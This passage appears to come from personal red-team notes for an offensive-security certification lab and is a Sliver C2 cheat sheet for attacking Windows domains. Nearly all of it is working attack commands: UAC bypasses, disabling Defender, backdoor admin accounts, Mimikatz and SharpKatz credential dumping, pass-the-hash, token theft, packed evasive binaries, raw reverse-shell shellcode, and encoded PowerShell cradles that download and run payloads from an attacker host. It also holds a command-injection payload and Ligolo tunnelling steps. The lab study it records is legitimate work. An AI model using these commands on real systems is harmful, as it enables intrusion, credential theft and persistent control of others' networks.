# Modify on line 15 from
                    <File Id="File0" Name="setup.exe" Source="setup.exe" /> <!-- Put the executable on the same directory-->

# to 
                    <File Id="File0" Name="setup.exe" Source="sliver.x64.exe" /> <!-- Put the executable on the same directory-->



# Compile
wixl -v WXS-Templates/alwaysInstallElevated-3.wxs -o alwaysInstallElevated.msi
sudo cp alwaysInstallElevated.msi /var/www/html
sudo chmod 777 /var/www/html/alwaysInstallElevated.msi


# Run on victim, another shell should pop up as NT Auth\System
execute -t 40 -o msiexec /qn /i http://10.10.10.11/alwaysInstallElevated.msi
```


### UAC Bypass

> Disabling defender before running getsystem is ideal

#### ComputerDefaults

```powershell
# Create registry for ComputerDefaults
New-Item "HKCU:\software\classes\ms-settings\shell\open\command" -Force
sharpsh -- -e -c TmV3LUl0ZW0gIkhLQ1U6XHNvZnR3YXJlXGNsYXNzZXNcbXMtc2V0dGluZ3Ncc2hlbGxcb3Blblxjb21tYW5kIiAtRm9yY2U=


# Add property
New-ItemProperty "HKCU:\software\classes\ms-settings\shell\open\command" -Name "DelegateExecute" -Value "" -Force
sharpsh -- -e -c TmV3LUl0ZW1Qcm9wZXJ0eSAiSEtDVTpcc29mdHdhcmVcY2xhc3Nlc1xtcy1zZXR0aW5nc1xzaGVsbFxvcGVuXGNvbW1hbmQiIC1OYW1lICJEZWxlZ2F0ZUV4ZWN1dGUiIC1WYWx1ZSAiIiAtRm9yY2U=


# Add another property with powershell code to be executed
execute -o powershell 'Set-ItemProperty "HKCU:\software\classes\ms-settings\shell\open\command" -Name "(default)" -Value "C:\Windows\System32\cmd.exe /c powershell -enc KABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQAwAC4AMQAwAC4AMQAwAC4AMQAxAC8AaABhAHYAMABjAC0AcABzAC4AdAB4AHQAJwApACAAfAAgAEkARQBYAA==" -Force'


# Run the process
execute -o powershell 'Start-Process "C:\Windows\System32\ComputerDefaults.exe"'


# Check privs
execute -o whoami /priv


# Get system shell
getsystem
```



#### Fodhelper

```powershell
# Create registry for Fodhelper
New-Item -Path HKCU:\Software\Classes\ms-settings\shell\open\command -Value "powershell.exe (iwr http://10.10.10.11/hav0c-ps.txt -usebasicparsing) | IEX" -Force
sharpsh -- -e -c TmV3LUl0ZW0gLVBhdGggSEtDVTpcU29mdHdhcmVcQ2xhc3Nlc1xtcy1zZXR0aW5nc1xzaGVsbFxvcGVuXGNvbW1hbmQgLVZhbHVlICJwb3dlcnNoZWxsLmV4ZSAoaXdyIGh0dHA6Ly8xOTIuMTY4LjQ1LjE5NC9oYXYwYy1wcy50eHQgLXVzZWJhc2ljcGFyc2luZykgfCBJRVgiIC1Gb3JjZQ==


# Create registry for Fodhelper
New-ItemProperty -Path HKCU:\Software\Classes\ms-settings\shell\open\command -Name DelegateExecute -PropertyType String -Force
sharpsh -- -e -c TmV3LUl0ZW1Qcm9wZXJ0eSAtUGF0aCBIS0NVOlxTb2Z0d2FyZVxDbGFzc2VzXG1zLXNldHRpbmdzXHNoZWxsXG9wZW5cY29tbWFuZCAtTmFtZSBEZWxlZ2F0ZUV4ZWN1dGUgLVByb3BlcnR5VHlwZSBTdHJpbmcgLUZvcmNl


# Run fodhelper
execute -o powershell 'Start-Process "C:\Windows\System32\fodhelper.exe"'


# Check privs
execute -o whoami /priv


# Get system shell
getsystem
```






## Privileged User - Post-Exploitation

> Things to do after getting privileged user account

### Flags

```powershell
# Recursive search for flags - Always in Users for Windows
cd C:/Users
execute -o tree /f /a


# proof is usually within admin's desktop
cat C:/Users/Administrator/Desktop/proof.txt


# local is usually within public's main directory
cat C:/Users/Public/local.txt
```

### Enable RDP

```powershell
# Enable RDP and allow its port
reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f
netsh firewall add portopening TCP 3389 "Remote Desktop"


# Encoded commands within sliver
sharpsh -- -e -c U2V0LUl0ZW1Qcm9wZXJ0eSAtUGF0aCAiSEtMTTpcU1lTVEVNXEN1cnJlbnRDb250cm9sU2V0XENvbnRyb2xcVGVybWluYWwgU2VydmVyIiAtTmFtZSAiZkRlbnlUU0Nvbm5lY3Rpb25zIiAtVmFsdWUgMCAtVHlwZSBEV29yZA0K
sharpsh -- -e -c bmV0c2ggZmlyZXdhbGwgYWRkIHBvcnRvcGVuaW5nIFRDUCAzMzg5ICJSZW1vdGUgRGVza3RvcCI=


# Allow PTH login 
New-ItemProperty -Path "HKLM:\System\CurrentControlSet\Control\Lsa" -Name DisableRestrictedAdmin -Value 0
sharpsh -- -c \"New-ItemProperty -Path \"HKLM:\\System\\CurrentControlSet\\Control\\Lsa\" -Name DisableRestrictedAdmin -Value 0\"


# RDP as Administrator with PTH
xfreerdp /u:Administrator /pth:a293fe16548ddab726ed3ace8cdee7ba /v:10.10.100.10 /cert:ignore /dynamic-resolution


# Once RDPed, open powershell as admin and run or use NXC to get shell on sliver
powershell -enc KABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQAwAC4AMQAwAC4AMQAwAC4AMQAxAC8AaABhAHYAMABjAC0AcABzAC4AdAB4AHQAJwApACAAfAAgAEkARQBYAA==
```


### Enable WinRM

```powershell
# Directly in pwsh
Enable-PSRemoting -Force


# Within sliver
sharpsh -- -c '"Enable-PSRemoting -Force"'
```



### Disable Defender & Firewall

```powershell
sharpsh -t 20 -- -c \"Set-MpPreference -DisableIntrusionPreventionSystem $true -DisableIOAVProtection $true -DisableRealtimeMonitoring $true\"
sharpsh -t 20 -- -u 'http://10.10.10.11/powershell-scripts/DefendersDeath.ps1' -c 1
```


### Persistence

```powershell
# Add a domain user we have already compromised as local admin on the machine - Helps with creds dumping as well
execute -o net localgroup administrators domain.com\\attacker /add
execute -o net localgroup administrators


# Create local user and add into local admins and RDP groups
execute -o net user /add userooo "Password123@" /Y
execute -o net localgroup administrators userooo /add
execute -o net localgroup "Remote Desktop Users" userooo /add
execute -o net localgroup "Remote Management Users" userooo /add
```


### Restarting the machine

```powershell
execute -o shutdown -r -t 0
```





## Credentials Dumping

### Mimikatz

#### Disable LSA protection

```powershell
# We need to upload the mimidrv.sys from where mimikatz would execute from
upload /home/kali/tools/bins/csharp-files/mimidrv.sys c:/windows/temp/mimidrv.sys


# Go to the directory
cd c:/windows/temp/
ls


# Now use PEzor to convert mimikatz into a C# executable with arguments to unload LSA protection by loading mimidrv.sys driver
mimikatz '"privilege::debug" "token::elevate" "!+" "!processprotect /process:lsass.exe /remove"'
```

#### Machine Credentials

```powershell
# LSASS Dump
mimikatz "token::elevate" "sekurlsa::logonpasswords" "exit"
mimikatz "token::elevate" "sekurlsa::dpapi" "exit"
mimikatz "token::elevate" "sekurlsa::ekeys" "exit"
mimikatz "token::elevate" "sekurlsa::wdigest" "exit"


# SAM/Secrets/Cache dump
mimikatz "token::elevate" "lsadump::sam" "exit"
mimikatz "token::elevate" "lsadump::secrets" "exit"
mimikatz "token::elevate" "lsadump::cache" "exit"


# Vault dump
mimikatz '"token::elevate" "vault::list" "exit"'
mimikatz '"token::elevate" "vault::cred /patch" "exit"'
```

#### PEZor - Mimikatz

```powershell
# Mimikatz
mimikatz "privilege::debug" "exit"
PEzor -unhook -antidebug -fluctuate=NA -format=dotnet -sleep=5 /home/kali/tools/bins/exes/mimikatz.exe -z 2 -p '"privilege::debug" "exit"'
execute-assembly /home/kali/tools/bins/exes/mimikatz.exe.packed.dotnet.exe


# We need to upload the mimidrv.sys from where mimikatz would execute from
upload /home/kali/tools/bins/csharp-files/mimidrv.sys c:/windows/temp/mimidrv.sys


# Go to the directory
cd c:/windows/temp/
ls


# Now use PEzor to convert mimikatz into a C# executable with arguments to unload LSA protection by loading mimidrv.sys driver
mimikatz "privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "exit"


# Looks like this
PEzor -unhook -antidebug -fluctuate=NA -format=dotnet -sleep=5 /home/kali/tools/bins/exes/mimikatz.exe -z 2 -p '"privilege::debug" "token::elevate" "!+" "!processprotect /process:lsass.exe /remove" "sekurlsa::logonpasswords" "exit"'
execute-assembly /home/kali/tools/bins/exes/mimikatz.exe.packed.dotnet.exe
```



### LaZagne

```powershell
# Upload Lazagne binary as its not in C#, defender should be disabled
upload /home/kali/tools/bins/exes/LaZagne.exe


# Run 
execute -o LaZagne.exe
execute -o LaZagne.exe all -v
```




### impacket-secretsdump

```powershell
# Local Admin on machine
impacket-secretsdump ./Administrator@machine -hashes ':ffffffffffffffffffffffffffffffff' -dc-ip 10.10.100.1 -target-ip 10.10.100.12


# Using credentials 
impacket-secretsdump domain.com/user:'Password123!'@machine -dc-ip 10.10.100.1 -target-ip 10.10.100.12
```

### nxc

```powershell
# DCSync along with other dumps using ticket
nxc smb dc01.domain.com --use-kcache --sam --lsa --dpapi -M ntdsutil
```

### SharpKatz

For dumping specific user credentials, need to specify domain name before the user or it won't work.

```powershell
# LSASS Dump
execute-assembly /home/kali/tools/bins/csharp-files/SharpKatz.exe --Command logonpasswords
execute-assembly /home/kali/tools/bins/csharp-files/SharpKatz.exe --Command ekeys


# DCSync
execute-assembly /home/kali/tools/bins/csharp-files/SharpKatz.exe --Command dcsync --Domain domain.com
execute-assembly /home/kali/tools/bins/csharp-files/SharpKatz.exe --Command dcsync --Domain domain.com --DomainController dc01.domain.com


# DCSync - As a user on a machine with no write perms - use this
execute-assembly /home/kali/tools/bins/csharp-files/SharpKatz.exe --Command dcsync --User DOMAIN\\Administrator --Domain domain.COM --DomainController dc01.domain.com
```




### Password Spraying

> Password, Hash and Tickets Spraying

```powershell
# Domain user creds
nxc smb 10.10.100.0/24 -d domain.com -u user -p password
nxc winrm 10.10.100.0/24 -d domain.com -u user -H ffffffffffffffffffffffffffffffff


# Local admin creds
nxc smb 10.10.100.0/24 -d . -u Administrator -H ffffffffffffffffffffffffffffffff


# Enumerate shares
nxc smb 10.10.100.0/24 -d domain.com -u user -p password --shares


# Tickets spraying
nxc smb 10.10.100.0/24 --use-kcache
nxc smb machine.domain.com --use-kcache --exec-method atexec -x "powershell -enc KABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQAwAC4AMQAwAC4AMQAwAC4AMQAxAC8AaABhAHYAMABjAC0AcABzAC4AdAB4AHQAJwApACAAfAAgAEkARQBYAA=="


# SSH creds spray
nxc ssh 10.10.100.0/24 -u user@domain.com -p password


# NXC Command Execution
nxc smb 10.10.100.15 -d domain.com -u user -H ffffffffffffffffffffffffffffffff --exec-method smbexec -x 'powershell -enc KABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQAwAC4AMQAwAC4AMQAwAC4AMQAxAC8AaABhAHYAMABjAC0AcABzAC4AdAB4AHQAJwApACAAfAAgAEkARQBYAA=='


# Local admin
nxc smb 10.10.100.15 -d . -u user -p password --exec-method atexec -x 'powershell -enc KABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQAwAC4AMQAwAC4AMQAwAC4AMQAxAC8AaABhAHYAMABjAC0AcABzAC4AdAB4AHQAJwApACAAfAAgAEkARQBYAA=='



# atexec always works
nxc smb 10.10.100.15 -d domain.com -u user -H ffffffffffffffffffffffffffffffff --exec-method atexec -x 'powershell -enc KABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQAwAC4AMQAwAC4AMQAwAC4AMQAxAC8AaABhAHYAMABjAC0AcABzAC4AdAB4AHQAJwApACAAfAAgAEkARQBYAA=='


# DB Spray
mssqlpwner domain.com/user:password@10.10.100.15 -windows-auth enumerate
mssqlpwner ./Administrator@10.10.100.15 -hashes ':ffffffffffffffffffffffffffffffff' -windows-auth enumerate
mssqlpwner domain.com/machineaccount\$@10.10.100.15 -hashes ':ffffffffffffffffffffffffffffffff' -windows-auth interactive enumerate
```






## Token Creation & Stealing

### PassTheHash PTH

```powershell
# PTH as a local user on a machine
mimikatz '"privilege::debug" "sekurlsa::pth /user:Administrator /domain:. /ntlm:ffffffffffffffffffffffffffffffff" "exit"'
mimikatz '"privilege::debug" "sekurlsa::pth /user:Administrator /domain:MACHINE01 /ntlm:ffffffffffffffffffffffffffffffff" "exit"'


# PTH as a domain user
mimikatz '"privilege::debug" "sekurlsa::pth /user:user /domain:domain.com /ntlm:ffffffffffffffffffffffffffffffff" "exit"'


# migrate into the pid
migrate -p 3316


# List C$
ls //machine/c$


# Lateral movement
psexec -d Title -s Description -p osep-lateral machine
```


#### Mimikatz - PWSH port

```powershell
# Mimikatz for this - preferably use cyberchef for base64 encoding - Fails because of powershell issues
sekurlsa::pth /user:Administrator /domain:domain.com /ntlm:ffffffffffffffffffffffffffffffff
IEX((new-object net.webclient).downloadstring('http://10.10.10.11/powershell-scripts/Invoke-Mimikatz.ps1'))


# Anything with spaces, requires `` for quotes escaping
Invoke-Mimikatz -Command "privilege::debug token::elevate `"sekurlsa::pth /user:Administrator /domain:domain.com /ntlm:ffffffffffffffffffffffffffffffff`" exit"


# Above base64 encoded command
sharpsh -i -t 40 -- -u 'http://10.10.10.11/powershell-scripts/Invoke-Mimikatz.ps1' -e -c SW52b2tlLU1pbWlrYXR6IC1Db21tYW5kICJwcml2aWxlZ2U6OmRlYnVnIHRva2VuOjplbGV2YXRlIGAic2VrdXJsc2E6OnB0aCAvdXNlcjpBZG1pbmlzdHJhdG9yIC9kb21haW46ZG9tYWluLmNvbSAvbnRsbTpmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmAiIGV4aXQi


# We can use PEzor to create mimikatz for PTH as well
PEzor -unhook -antidebug -fluctuate=NA -format=dotnet -sleep=5 /home/kali/tools/bins/exes/mimikatz.exe -z 2 -p '"privilege::debug" "sekurlsa::pth /user:Administrator /domain:domain.com /ntlm:ffffffffffffffffffffffffffffffff" "exit"'
execute-assembly -i /home/kali/tools/bins/exes/mimikatz.exe.packed.dotnet.exe


# Execute shellcode within the mimi created process
execute-shellcode -p 4428 /home/kali/OSEP/hav0c/sliver.x64.bin
```


#### Mimikatz - PEZor

```powershell
# Sliver also has its own mimikatz implementation, we can use that - It works with DLL injection
mimikatz '"privilege::debug" "sekurlsa::pth /user:username /domain:domain.com /ntlm:ffffffffffffffffffffffffffffffff" "exit"'


# We can use mimikatz and then migrate or just find a process running as that user and inject into it
PEzor -unhook -antidebug -fluctuate=NA -format=dotnet -sleep=5 /home/kali/tools/bins/exes/mimikatz.exe -z 2 -p '"privilege::debug" "sekurlsa::pth /user:username /domain:domain.com /ntlm:ffffffffffffffffffffffffffffffff" "exit"'
execute-assembly /home/kali/tools/bins/exes/mimikatz.exe.packed.dotnet.exe


# Migrate into the process
migrate -p 4712
```


#### SharpNamedPipePTH

```powershell
# Runs the cmd.exe
execute-assembly /home/kali/tools/bins/csharp-files/SharpNamedPipePTH.exe username:domain\\user hash:ffffffffffffffffffffffffffffffff binary:C:\\windows\\system32\\cmd.exe


# Find out process launched
ps -e cmd.exe


# Migrate into the process
migrate -p 1234


# Directly get shell
execute-assembly /home/kali/tools/bins/csharp-files/SharpNamedPipePTH.exe 'username:domain\\user hash:ffffffffffffffffffffffffffffffff binary:"C:\\WINDOWS\\System32\\WindowsPowerShell\\v1.0\\powershell.exe" arguments:"-nop -w 1 -sta -enc KABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQA5ADIALgAxADYAOAAuADQANQAuADEAOQAwAC8AaABhAHYAMABjAC0AcABzAC4AdAB4AHQAJwApACAAfAAgAEkARQBYAA=="'
```



### make-token

```powershell
# For local user
make-token -d . -u Administrator -p 'password'


# For domain user
make-token -d domain.com -u userooo2 -p 'User123123@'
```


### netexec

> Not really related to token stealing/creation but a good option to get shell

```powershell
nxc smb 10.10.100.20 -d . -u Administrator -p 'password' --exec-method atexec -x 'powershell -enc KABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQAwAC4AMQAwAC4AMQAwAC4AMQAxAC8AaABhAHYAMABjAC0AcABzAC4AdAB4AHQAJwApACAAfAAgAEkARQBYAA=='


# Wmi
nxc wmi 10.10.100.20 --local-auth -u Administrator -p 'password' --rpc-timeout 10


# impacket
impacket-wmiexec ./Administrator:'password'@10.10.100.20
```



### runas

#### Injection

```powershell
# Do a runas to get another shell as the local administrator
runas -d . -u Administrator -P 'password' -n -p C:\\windows\\SysWOW64\\notepad.exe
runas -d . -u Administrator -P 'password' -n -p C:\\Windows\\System32\\cmd.exe


# 
runas -d . -u userooo -P 'Password123@' -n -p C:\\Windows\\System32\\cmd.exe


# Runas a domain user
runas -d domain.com -u user -P 'Password123!' -n -p C:\\windows\\SysWOW64\\notepad.exe
runas -d domain.com -u user -P 'Password123!' -n -p C:\\Windows\\System32\\cmd.exe


# Find process
ps -e notepad


# Migrate into the process
migrate -p 11216


# Use the new session
use c4578a6f


# List the C$ 
ls //machine02.domain.com/c$
```

#### Direct Shell

Sometimes the local user won't work, if that's the case and you have the local admin's password, just run nxc or secretsdump to dump all hashes and psexec/atexec as the user. 

```powershell
# Domain User
runas -d domain.com -u user -P password -n -p "C:\Windows\System32\cmd.exe" -a "/c powershell -enc KABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQAwAC4AMQAwAC4AMQAwAC4AMQAxAC8AaABhAHYAMABjAC0AcABzAC4AdAB4AHQAJwApACAAfAAgAEkARQBYAA=="


# Local User
runas -d . -u Administrator -P 'password'-n -p "C:\Windows\System32\cmd.exe" -a "/c powershell -enc KABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQAwAC4AMQAwAC4AMQAwAC4AMQAxAC8AaABhAHYAMABjAC0AcABzAC4AdAB4AHQAJwApACAAfAAgAEkARQBYAA=="


# 
runas -d . -u userooo -P 'Password123@' -n -p "C:\Windows\System32\cmd.exe" -a "/c powershell -enc KABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQAwAC4AMQAwAC4AMQAwAC4AMQAxAC8AaABhAHYAMABjAC0AcABzAC4AdAB4AHQAJwApACAAfAAgAEkARQBYAA=="
```


### Rubeus createnetonly

```powershell
# Create process with the user credentials
rubeus -t 20 -- createnetonly /program:C:\\Windows\\System32\\cmd.exe /domain:domain.com /username:user /password:password123


# Migrate to the process or exec-shellcode, whichever works
migrate -p 2560
```


### $cred in pwsh

Fancy replacement to runas

```powershell
# Get into shell
shell


# Run the following
$pass = ConvertTo-SecureString 'NewP@ssword123!' -AsPlainText -Force`
$Cred = New-Object System.Management.Automation.PSCredential("domain\user", $pass)


# Start the process
Start-Process powershell.exe -Credential $Cred -ArgumentList "-exec bypass -C `"IEX(New-Object Net.WebClient).DownloadString('http://10.10.10.11/payload.txt')`""
```

### Steal Token 

To steal token of some other user based on a running, either use `migrate` or `execute-shellcode` for that PID. Try and use `migrate` first and if it fails use the `execute-shellcode` as a fallback.

#### migrate

```powershell
migrate -p 4792
```

#### execute-shellcode

```powershell
execute-shellcode -S -r -I 30 -p 5096 /home/kali/OSEP/hav0c/sliver.x64.bin
```

#### SharpImpersonation

> This will find processes as the specified user and run shellcode within the first found process

When lots of processes as different users are running, wmi is fastest to enumerate

```powershell
# List processes to impersonate // elevated
execute-assembly /home/kali/tools/bins/csharp-files/SharpImpersonation.exe list
execute-assembly /home/kali/tools/bins/csharp-files/SharpImpersonation.exe list wmi
execute-assembly /home/kali/tools/bins/csharp-files/SharpImpersonation.exe list elevated


# Execute command as user
execute-assembly /home/kali/tools/bins/csharp-files/SharpImpersonation.exe user:domain\\user binary:"powershell ls"


# Load base64 encoded shellcode
base64 -w0 /home/kali/OSEP/hav0c/sliver.x64.bin
execute-assembly -i /home/kali/tools/bins/csharp-files/SharpImpersonation.exe user:domain\\user shellcode:/EiD5PDozAAAAEFRQVBSUUgx0mVIi1JgVkiLUhhIi1IgSItyUEgPt0pKTTHJSDHArDxhfAIsIEHByQ1BAcHi7VJIi1IgQVGLQjxIAdBmgXgYCwIPhXIAAACLgIgAAABIhcB0Z0gB0ESLQCBJAdCLSBhQ41ZNMclI/8lBizSISAHWSDHAQcHJDaxBAcE44HXxTANMJAhFOdF12FhEi0AkSQHQZkGLDEhEi0AcSQHQQYsEiEgB0EFYQVheWVpBWEFZQVpIg+wgQVL/4FhBWVpIixLpS////11JvndzMl8zMgAAQVZJieZIgeygAQAASYnlSbwCABFbwKgtvkFUSYnkTInxQbpMdyYH/9VMiepoAQEAAFlBuimAawD/1WoKQV5QUE0xyU0xwEj/wEiJwkj/wEiJwUG66g/f4P/VSInHahBBWEyJ4kiJ+UG6maV0Yf/VhcB0Ckn/znXl6JMAAABIg+wQSIniTTHJagRBWEiJ+UG6AtnIX//Vg/gAflVIg8QgXon2akBBWWgAEAAAQVhIifJIMclBulikU+X/1UiJw0mJx00xyUmJ8EiJ2kiJ+UG6AtnIX//Vg/gAfShYQVdZaABAAABBWGoAWkG6Cy8PMP/VV1lBunVuTWH/1Un/zuk8////SAHDSCnGSIX2dbRB/+dYagBZu+AdKgpBidr/1Q==


# Host shellcode on the web server
sudo cp /home/kali/OSEP/hav0c/sliver.x64.bin /var/www/html
sudo chmod 777 /home/kali/OSEP/hav0c/sliver.x64.bin


# Load shellcode from the URL - works the best
execute-assembly /home/kali/tools/bins/csharp-files/SharpImpersonation.exe user:domain\\user shellcode:http://10.10.10.11/sliver.x64.bin
execute-assembly /home/kali/tools/bins/csharp-files/SharpImpersonation.exe user:domain\\user shellcode:http://10.10.10.11/sliver.x86.bin


# On custom PID 
execute-assembly /home/kali/tools/bins/csharp-files/SharpImpersonation.exe pid:644 shellcode:http://10.10.10.11/sliver.x86.bin
```


#### Msfconsole 

> Just in case sliver fails lol

```powershell
# Metasploit - x64 shellcode
sudo msfvenom -p windows/x64/meterpreter/reverse_https LHOST=tun0 LPORT=443 EXITFUNC=thread -f raw -o /home/kali/OSEP/hav0c/metasploit.x64.bin


# Listener - msfconsole
sudo msfconsole -q -x 'use exploit/multi/handler;set payload windows/x64/meterpreter/reverse_https;set lhost tun0;set lport 443; set exitfunc thread; set EnableStageEncoding true; set exitonsession false; run -j'


# Execute metasploit.x64.bin to get within msf
execute-shellcode -S -r -I 30 /home/kali/OSEP/hav0c/metasploit.x64.bin


# Within msf
load incognito


# List users
list_tokens -u


# Impersonate
impersonate_token domain\\user


# Get shell as the impersonated user
shell
powershell -enc KABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQAwAC4AMQAwAC4AMQAwAC4AMQAxAC8AaABhAHYAMABjAC0AcABzAC4AdAB4AHQAJwApACAAfAAgAEkARQBYAA==


# Sliver
# We get the shell back as domain\user and can continue to enumerate
```




## Tunneling

### Portfwd

Access port 3389 of the host 10.10.100.30 through our local ip:33890

```powershell
portfwd add -b 127.0.0.1:33890 -r 10.10.100.30:3389
```


### Socks5 Proxy

Select the session within sliver and then run the following - later configure `/etc/proxychains.conf` accordingly

```powershell
socks5 start
```

### Ligolo

> Make sure defender is disabled or ligolo might get removed


```powershell
# Upload the agent
upload /home/kali/tools/ligolo-ng/agent.exe c:/windows/tasks/agent.exe
ls c:/windows/tasks/agent.exe


# Start the ligolo proxy on kali
sudo /home/kali/tools/ligolo-ng/proxy -selfcert -laddr 10.10.10.11:4444


# Delete the interfaces if already exist (in case ip ranges change on next connection)
interface_delete --name osep-challenge
interface_delete --name osep-challenge-vault


# After starting, create a interface and assign route
interface_create --name osep-challenge
interface_route_add --name osep-challenge --route 10.10.100.0/24


# Add another one
interface_create --name osep-challenge-vault
interface_route_add --name osep-challenge-vault --route 10.10.200.25/32


# Connect from the victim machine back to attacker machine with interactive shell
shell
C:\Windows\tasks\agent.exe -connect 10.10.10.11:21 -ignore-cert -retry


# Or run directly, will have to Ctrl + C and launch sliver again, don't worry though the process will keep running!
execute -t 1000 -o C:\\Windows\\tasks\\agent.exe -connect 10.10.10.11:4444 -ignore-cert -retry


# Select the session
session


# Start the tunnel 
tunnel_start --tun osep-challenge
tunnel_start --tun osep-challenge-vault
```


#### Port Forwarding through Ligolo 

In this scenario the machine machine05 can't access our machine kali but can access jump01 and we have compromised jump01
- machine05 -> jump01:8000 -> kali:80 to download sliver implant from our apache2 server
- machine05 -> jump01:8088 -> kali:8088 - for sliver beaconing

```powershell
# Create listener (from jump01:8000 -> kali:80)
listener_add --addr 10.10.250.10:8000 --to 0.0.0.0:80


# We'll use the IP of Jump01 - 10.10.250.10
curl -k --negotiate -u : 'http://machine05.domain.com/Internal/GetCPULoad' -X POST -d 'machine05 -Class Win32_Processor);powershell.exe curl http://10.10.250.10:8000/;#'


# Generate sliver beacon - IP of jump01
generate beacon --http 10.10.250.10:8088 --name sliver.obfuscated --os windows --seconds 5 --jitter 0 --evasion


# Get the sliver beacon
sudo cp /home/kali/OSEP/challenges/ch7/sliver.obfuscated.exe /var/www/html
sudo chmod 777 /var/www/html/sliver.obfuscated.exe


# Get shell access
curl -k --negotiate -u : 'http://machine05.domain.com/Internal/GetCPULoad' -X POST -d 'machine05 -Class Win32_Processor);powershell.exe curl http://10.10.250.10:8000/sliver.obfuscated.exe -O C:\Windows\temp\sliver.obfuscated2.exe ;#'
curl -k --negotiate -u : 'http://machine05.domain.com/Internal/GetCPULoad' -X POST -d 'machine05 -Class Win32_Processor);powershell.exe ls C:\Windows\temp\sliver.obfuscated2.exe ;#'


# Create another listener (from jump01:8090 -> sliver:8088)
listener_add --addr 10.10.250.10:8088 --to 10.10.10.11:8088


# Run the .exe
curl -k --negotiate -u : 'http://machine05.domain.com/Internal/GetCPULoad' -X POST -d 'machine05 -Class Win32_Processor);cmd.exe /c C:\Windows\temp\sliver.obfuscated2.exe ;#'
```







## Lateral Movement

### PsExec

```powershell
# Use psexec to move laterally after creating/stealing token
psexec -d Title -s Description -p osep-lateral machine02.domain.com
psexec -d Title -s Description -p osep-lateral DC06


# Use the new session
use a4a458c1
```


### SharpRDP

> SharpRDP does not work and hangs after authentication - leaving notes here for future testing

```powershell
upload /home/kali/tools/bins/csharp-files/SharpRDP.exe c:/windows/temp/sharprdp.exe
cd c:/windows/temp/


# Works but hangs
c:/windows/temp/sharprdp.exe computername=10.10.100.30 command=calc username=domain\user password="User123123@"


# To be tested
c:/windows/temp/sharprdp.exe computername=machine06.domain.com command="powershell ls"
c:/windows/temp/sharprdp.exe computername=dc02.domain.com command="powershell ls"
c:/windows/temp/sharprdp.exe username=domain\user password="User123123@" computername=10.10.200.15 command="powershell ls"
c:/windows/temp/sharprdp.exe username=domain\user password="User123123@" computername=10.10.100.30 command="powershell ls"
c:/windows/temp/sharprdp.exe username=domain\user password="User123123@" computername=10.10.200.15 command="powershell ls"
c:/windows/temp/sharprdp.exe username=domain\user password="User123123@" computername=dc04 command="notepad"
c:/windows/temp/sharprdp.exe computername=dc04 command=calc username=domain\user password="User123123@"


# Within sliver
sharprdp -- computername=10.10.200.15 password=password username=Administrator command=C:\\Windows\\Temp\\sliver2.beacon.exe
```





## Domain Enumeration

```powershell
sharpsh -t 20 -- '-u http://10.10.10.11/powershell-scripts/PowerView.ps1 -c "Get-DomainComputer"'
